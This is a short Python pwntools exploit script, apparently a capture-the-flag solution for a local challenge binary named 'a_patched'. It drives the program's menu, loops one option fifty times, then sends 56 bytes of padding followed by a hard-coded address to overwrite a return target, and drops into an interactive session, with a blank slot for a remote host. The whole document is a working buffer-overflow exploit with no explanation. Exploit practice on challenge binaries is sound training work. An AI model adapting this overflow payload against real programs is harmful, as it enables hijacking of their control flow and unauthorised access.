#!/usr/bin/python3

from pwn import *

exe = ELF('a_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b* 0x401450

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

for i in range(50):
        sla(b'Exit', '3')

sla(b'Exit', '2')
sla(b':', b'aaaabbbb')

sla(b'Exit', '1')

sla(b'Exit', '2')
sla(b':', b"a"*56+p64(0x0000000000401255))

sla(b'Exit', '5')

p.interactive()
